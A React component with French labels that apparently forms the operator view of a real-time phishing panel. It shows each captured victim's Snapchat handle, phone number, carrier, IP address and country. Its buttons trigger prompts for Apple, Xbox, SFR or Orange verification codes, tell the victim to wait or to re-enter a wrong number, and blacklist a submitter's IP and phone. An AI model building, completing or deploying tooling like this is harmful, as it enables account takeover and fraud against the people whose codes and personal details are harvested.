import { useState } from "react";
import { motion } from "framer-motion";
import { Send, Hash, Ban, Clock, X, Ghost, Phone, MapPin, Globe } from "lucide-react";
import { base44 } from "@/api/base44Client";

const opPill = {
  SFR: { bg: "#FDECEA", fg: "#C0392B" },
  Bouygues: { bg: "#CDE8F0", fg: "#0869A6" },
  Orange: { bg: "#FDEBD0", fg: "#B9770E" },
};

function formatFull(tel) {
  const d = String(tel || "").replace(/\D/g, "");
  return d.match(/.{1,2}/g)?.join(" ") || d;
}

export default function SubmissionActions({ sub, discord, onDone }) {
  const [busy, setBusy] = useState(null);
  const [result, setResult] = useState("");

  const runAction = async (action) => {
    setBusy(action);
    setResult("");
    try {
      const res = await base44.functions.invoke("sendCode", { submissionId: sub.id, action, discord });
      if (res?.data?.discord_required) {
        setResult("Identification Discord requise");
      } else {
        setResult("Action envoyée ✓");
        setTimeout(() => onDone?.(), 1200);
      }
    } catch (err) {
      setResult(err?.response?.data?.error || "Échec de l'action");
    }
    setBusy(null);
  };

  const runBlacklist = async () => {
    setBusy("blacklist");
    setResult("");
    try {
      await base44.functions.invoke("blacklistUser", {
        ip: sub.ip_address,
        telephone: sub.telephone,
        submissionId: sub.id,
      });
      await base44.functions.invoke("sendCode", { submissionId: sub.id, action: "wrong", discord }).catch(() => {});
      setResult("Blacklisté ✓");
      setTimeout(() => onDone?.(), 1200);
    } catch (err) {
      setResult(err?.response?.data?.error || "Échec");
    }
    setBusy(null);
  };

  const op = opPill[sub.operateur] || opPill.Bouygues;

  const actions = [
    { key: "code_ready", label: "Code 4 (Apple)", icon: Send, style: { background: "#0D7061", color: "#fff" } },
    { key: "code6", label: "Code 6 (Xbox)", icon: Hash, style: { background: "#6C3483", color: "#fff" } },
    { key: "code6sfr", label: "Code 6 (SFR)", icon: Hash, style: { background: "#C0392B", color: "#fff" } },
    { key: "code6orange", label: "Code 6 (Orange)", icon: Hash, style: { background: "#E67E22", color: "#fff" } },
    { key: "wrong", label: "Mauvais numéro", icon: X, style: { background: "#FDECEA", color: "#C0392B" } },
    { key: "wait", label: "Faire patienter", icon: Clock, style: { background: "#CDE8F0", color: "#0869A6" } },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-white rounded-2xl p-5 shadow-sm border"
      style={{ borderColor: "#DFE6E9" }}
    >
      <div className="flex flex-wrap items-center gap-2 mb-4">
        <span className="px-2.5 py-1 rounded-md text-[11px] font-semibold" style={{ background: op.bg, color: op.fg }}>
          {sub.operateur}
        </span>
        <span className="px-2.5 py-1 rounded-md text-[11px] font-semibold" style={{ background: "#E6F2EF", color: "#0D7061" }}>
          Verrouillé par vous
        </span>
      </div>

      <div className="space-y-2 mb-4">
        <div className="flex items-center gap-2">
          <Ghost className="w-4 h-4" style={{ color: "#636E72" }} />
          <span className="text-base font-bold" style={{ color: "#2D3436" }}>@{sub.snapchat}</span>
        </div>
        <div className="flex items-center gap-2">
          <Phone className="w-4 h-4" style={{ color: "#636E72" }} />
          <span className="text-base font-mono" style={{ color: "#2D3436" }}>{formatFull(sub.telephone)}</span>
        </div>
      </div>

      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-4" style={{ color: "#636E72" }}>
        {sub.ip_address && (
          <span className="flex items-center gap-1"><MapPin className="w-3 h-3" />{sub.ip_address}</span>
        )}
        {sub.country && sub.country !== "Inconnue" && (
          <span className="flex items-center gap-1"><Globe className="w-3 h-3" />{sub.country}</span>
        )}
      </div>

      <div className="grid grid-cols-2 gap-2">
        {actions.map((a) => {
          const Icon = a.icon;
          return (
            <button
              key={a.key}
              onClick={() => runAction(a.key)}
              disabled={!!busy}
              className="flex items-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50"
              style={a.style}
            >
              {busy === a.key ? (
                <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              ) : (
                <Icon className="w-3.5 h-3.5" />
              )}
              {a.label}
            </button>
          );
        })}
        <button
          onClick={runBlacklist}
          disabled={!!busy}
          className="col-span-2 flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold transition-colors disabled:opacity-50"
          style={{ background: "#6B1818", color: "#FADBD8" }}
        >
          {busy === "blacklist" ? (
            <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
          ) : (
            <Ban className="w-3.5 h-3.5" />
          )}
          Blacklist instant
        </button>
      </div>
      {result && <p className="text-center text-xs mt-3" style={{ color: "#636E72" }}>{result}</p>}
    </motion.div>
  );
}